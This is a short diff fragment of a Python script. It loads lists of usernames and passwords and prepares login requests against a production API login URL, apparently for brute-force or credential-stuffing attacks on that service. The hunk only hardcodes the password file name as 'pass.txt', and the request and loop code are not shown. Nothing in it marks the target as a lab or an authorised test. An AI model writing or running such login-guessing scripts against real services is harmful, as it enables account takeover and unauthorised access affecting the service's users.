@@ -9,7 +9,7 @@ url = 'https://production.api.ezygo.app/api/v1/Xcr45_salt/login'
 with open(user_file, 'r') as f:
     usernames = [line.strip() for line in f]
 
-with open(pass_file, 'r') as f:
+with open('pass.txt', 'r') as f:
     passwords = [line.strip() for line in f]
 
 def send_request(user, pwd):
